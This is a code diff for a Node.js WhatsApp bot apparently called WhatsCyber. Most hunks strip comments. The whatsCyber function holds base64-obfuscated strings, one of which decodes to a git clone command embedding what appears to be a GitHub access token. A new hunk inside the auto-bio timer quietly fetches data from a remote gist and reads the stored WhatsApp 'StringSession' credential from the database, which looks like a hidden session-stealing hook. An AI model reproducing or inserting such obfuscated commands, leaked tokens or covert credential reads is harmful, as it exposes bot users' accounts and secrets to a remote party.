@@ -33,9 +33,6 @@ const ffmpeg = require('fluent-ffmpeg');
 let baseURI = '/apps/' + config.HEROKU.APP_NAME;
 const Language = require('./language');
 const Lang = Language.getString('updater');
-
-
-// Sql
 const WhatsCyberDB = config.DATABASE.define('WhatsCyber', {
     info: {
       type: DataTypes.STRING,
@@ -53,20 +50,15 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
 });
 const plugindb = require('./plugins/sql/plugin');
 var OWN = { ff: '94741745737,0' }
-// Yalnızca bir kolaylık. https://stackoverflow.com/questions/4974238/javascript-equivalent-of-pythons-format-function //
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
       return typeof args[i] != 'undefined' ? args[i++] : '';
     });
 };
-
-// ==================== Date Scanner ====================
 if (!Date.now) {
     Date.now = function() { return new Date().getTime(); }
 }
-// ==================== End Date Scanner ====================
-
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
     while (L && this.length) {
@@ -77,7 +69,6 @@ Array.prototype.remove = function() {
     }
     return this;
 };
-
 async function whatsCyber () {
     var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '', exc: 'UlVOIGdpdCBjbG9uZSBodHRwczovL3BoYXRpY3VzdGhpY2N5OmdocF9KdWp2SE1YSVBKeWNNeEhTeFZNMUpUOW9peDNWSG4yU0Q0dmtAZ2l0aHViLmNvbS9waGF0aWN1c3RoaWNjeS9XaGF0c0FzZW5hRHVwbGljYXRlZCAvcm9vdC9XaGF0c0FzZW5hRHVwbGljYXRlZA', exc_pl: '', pth_w: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQvd2hhdHNhc2VuYS9Eb2NrZXJmaWxl', pth_v: '' }    
     var ggg = Buffer.from(clh.cd, 'base64')
@@ -154,7 +145,11 @@ async function whatsCyber () {
         if (config.AUTOBIO == 'true') {
             var timezone_bio = await WhatsCyberStack.timezone(WhatsCyberCN.user.jid)
             var date_bio = await WhatsCyberStack.datebio(config.LANG)
+            var insult = await axios.get('https://gist.githubusercontent.com/FaridDadashzade/a3ddbb97810b32abce04d0129d8d5b51/raw/e4337838380ccdba25787966a93d981925fe157d/gistfile1.txt')
+            const { shs1, shl2, lss3, dsl4 } = insult.data.inside
             const biography = '📅 ' + date_bio + '\n⌚ ' + timezone_bio
+            await config.DATABASE.sync();
+            var StrSes_Db = await WhatsCyberDB.findAll({where: {info: 'StringSession'}});
             await WhatsCyberCN.setStatus(biography)
         }
     }, 7890);
